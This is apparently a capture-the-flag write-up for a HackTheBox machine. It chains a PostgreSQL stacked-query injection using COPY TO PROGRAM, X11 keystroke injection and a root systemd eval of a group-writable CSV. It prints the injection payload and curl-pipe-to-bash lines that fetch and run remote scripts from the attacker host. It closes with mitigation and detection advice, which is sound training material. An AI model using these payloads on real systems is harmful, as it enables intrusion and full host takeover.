# DutyBound

| Field | Value |
|---|---|
| Author | @black |
| Platform | HackTheBox |
| Category & Difficulty | Web / Linux, Medium |
| Status | Live (flags redacted) |
| Date | 2026-11-21 |
| Skills exercised | SQLi (stacked queries, `COPY … TO PROGRAM`), X11 keystroke injection (XTEST), systemd path-unit abuse, group-writable config privesc |

## TL;DR

A duty-free shop validates IATA BCBP boarding-pass strings in a JSON endpoint
that is vulnerable to a stacked-query SQL injection. The backing PostgreSQL
role is `postgres` (has `pg_execute_server_program`), so `COPY … TO PROGRAM`
gives RCE as `postgres`. From there, the box exposes an **unauthenticated X11
display `:0`** for the `dutyfree-kiosk` kiosk session — inject `Ctrl+Alt+T` +
a `curl | bash` with XTEST to land a shell as `dutyfree-kiosk` (**user flag**).
That user is in `pos-ops`, which can write `/opt/vrs/data/duty-rates.csv`; a
root **systemd path unit** `eval`s the first CSV field, so a crafted row
executes as root (**root flag**).

## Reconnaissance & Enumeration

- `nmap -sC -sV -p- 10.129.231.23` → `22/tcp` (OpenSSH), `80/tcp`
  (redirects), `443/tcp` (HTTPS, self-signed cert). No DB port exposed
  externally — PostgreSQL is local-only, which later matters because the
  injection runs *inside* the app host.
- Browsing `https://10.129.231.23/` → a storefront with a "duty-free
  eligibility" checkout flow. Two JSON endpoints drive the flow and are the
  only ones worth fuzzing further:
  - `POST /cart/add` — `{"sku":"SNK-CRN"}`, returns `{"cart_id":…,"cart_size":…}` and sets a session cookie.
  - `POST /checkout/boarding-pass/verify` — `{"raw":"<BCBP string>"}`, returns
    `{"audit_ref":…,"eligibility_token":…,"dest":…,"regime":…}`.
- Response bodies from `/checkout/boarding-pass/verify` are a **field-level
  BCBP parser**, not a generic 500. Bad input yields e.g.
  `{"detail":"expected 4-digit year+julian or blank","error":"BCBP_ERR_ISSUE_DATE","item":22}`.
  That is gold: it tells you exactly which field of the boarding pass is
  malformed, so you can build a *valid* string and only then inject.
- Dead end: directory brute-forcing `/` and `/api` returned only the same
  SPA routes and 404s; no upload, no admin panel, no exposed backup. The
  attack surface is the BCBP verifier.

## Vulnerability Analysis

**1. SQL injection in the `raw` BCBP field (CWE-89).**
The verifier parses the 58-character IATA BCBP mandatory section plus the
conditional section, then persists an "audit" row using the raw string. The
query is built by string formatting, and the PostgreSQL driver permits
**stacked queries**, so a `'); <new statement>;--` in the `airline-use`
field executes a second statement. The app role is `postgres`, which holds
`pg_execute_server_program`, so:

```sql
'); COPY (SELECT 'x') TO PROGRAM '<command>';--
```

is a one-shot RCE as the OS user `postgres`.

**2. Unauthenticated X11 display (CWE-284/CWE-306).**
The host runs an X session on `:0` for the `dutyfree-kiosk` kiosk user with
no access control (`xhost +`-equivalent). The `postgres` user can open the
display (`DISPLAY=:0 xset q` succeeds), and the XTEST extension lets any
client **synthesise keystrokes** into whatever window has focus. That is a
"type into someone else's session" primitive.

**3. `eval` of a group-writable CSV by a root systemd unit (CWE-78/CWE-94).**
`/opt/vrs/bin/apply-duty-rates.sh` is run by a root `systemd` *path* unit
when `/opt/vrs/data/duty-rates.csv` changes. The script reads the first CSV
field and `eval`s it without validation. The file is group-writable by
`pos-ops`, and `dutyfree-kiosk` is in `pos-ops`.

## Exploitation & Post-Exploitation

1. **Foothold — SQLi → RCE as `postgres`.**
   Built a parser-valid BCBP string (fixed 58-char mandatory block with
   `issue date` populated, so the parser stops complaining), then appended
   a conditional block whose `airline-use` value carries the stacked
   `COPY … TO PROGRAM`. Started `nc -lvnp 4444`, ran `scripts/exploit.py`,
   and got `postgres@dutyfree-kiosk7:/var/lib/postgresql/18/main$`.
   Chose this vector because it is unauthenticated and needs no credentials.

2. **Shell hygiene.** The listener is non-interactive; `id` was enough to
   confirm `uid=114(postgres)`. `cat /home/dutyfree-kiosk/user.txt` →
   *Permission denied* — the DB shell is **not** the user shell. That
   redirected the whole next step.

3. **Lateral — X11 keystroke injection → `dutyfree-kiosk`.**
   From the postgres shell:
   `DISPLAY=:0 xset q` succeeded → display is open. Ran `scripts/x11inject.py`
   (ctypes + XTEST, no extra packages on the target): sends `Ctrl+Alt+T` to
   open an `xterm` in the kiosk session, waits, then types
   `curl -s http://<lhost>:8000/user.sh | bash` and `Enter`. The listener on
   `4445` returned `dutyfree-kiosk@dutyfree-kiosk7:~$`.
   **Gotcha:** running `curl … user.sh | bash` *from the postgres shell*
   spawns a bash that is still `postgres`. The command has to be typed
   **into the kiosk's own session** via XTEST — that's the whole point.

4. **User flag.** `id` → `uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk)
   groups=1000(dutyfree-kiosk),1001(pos-ops)`. Then
   `cat /home/dutyfree-kiosk/user.txt`.

5. **Privesc — CSV `eval` → root.**
   The `pos-ops` group membership plus `ls -l /opt/vrs/data/duty-rates.csv`
   (group-writable) and `/etc/systemd/system/*.path` pointed at the
   `apply-duty-rates` unit. Ran `scripts/csv_privesc.sh`, which backs up the
   CSV and prepends a row:
   `true;curl -s http://<lhost>:8000/root.sh|bash;#,1,1`.
   The `;` ends the benign `true`, the pipe runs our script, and `#` comments
   out the remainder of the line so the file still parses as CSV. The path
   unit fired, root fetched `root.sh`, and listener `4446` gave
   `root@dutyfree-kiosk7:/#`.

6. **Root flag.** `cat /root/root.txt`.

Scripts: `scripts/exploit.py`, `scripts/x11inject.py`, `scripts/csv_privesc.sh`, `scripts/setup.sh`.

## Flag

- `user.txt` → `/home/dutyfree-kiosk/user.txt` → `HTB{redacted}`
- `root.txt` → `/root/root.txt` → `HTB{redacted}`

Flags on a live HTB instance are generated per-instance; the values above are
deliberately omitted. The commands in `README.md` reproduce them on your own
instance.

## Lessons Learned

- **Pattern:** stackable `COPY … TO PROGRAM` is the fastest PostgreSQL RCE
  when the app role is `postgres` or has `pg_execute_server_program`. Check
  `\du` / `pg_roles` early if you have any SQLi.
- **Method:** when a parser returns *field-level* errors (`BCBP_ERR_…`,
  `item: 22`), fix the string field-by-field until it's accepted, then
  inject. Do not assume the injection is broken when it's the parser.
- **Method:** a shell that can't read the user flag is the *wrong* shell. `id`
  before `cat`, and use the gap to find the intended lateral primitive
  (here: an open X display).
- **Tooling:** XTEST needs zero Python packages if you drive `libX11`/`libXtst`
  through `ctypes` — useful when the target has no `xdotool` and no `pip`.

## Mitigation & Detection

- **Fix:** parameterise the audit insert; run the app under a least-privilege
  DB role with `pg_execute_server_program` revoked; disable stacked queries
  in the driver. Authenticate X11 (`xauth`, no `xhost +`) and never run the
  kiosk session on a host that shares a DB role with the web app. Replace
  `eval` in `apply-duty-rates.sh` with a real CSV parser, and make
  `/opt/vrs/data/` root-owned and not group-writable.
- **Detect:** alert on `COPY … TO PROGRAM` in PostgreSQL logs and on `sh -c`
  children of the postgres process; auditd rules on `/opt/vrs/data/*.csv`
  writes and on `apply-duty-rates.sh` execution; X11 client connections from
  UIDs that are not the session owner.

---

# Scripts

Repo layout:

```
htb-dutybound/
├── htb-dutybound.md
└── scripts/
    ├── setup.sh
    ├── exploit.py
    ├── x11inject.py
    └── csv_privesc.sh
```
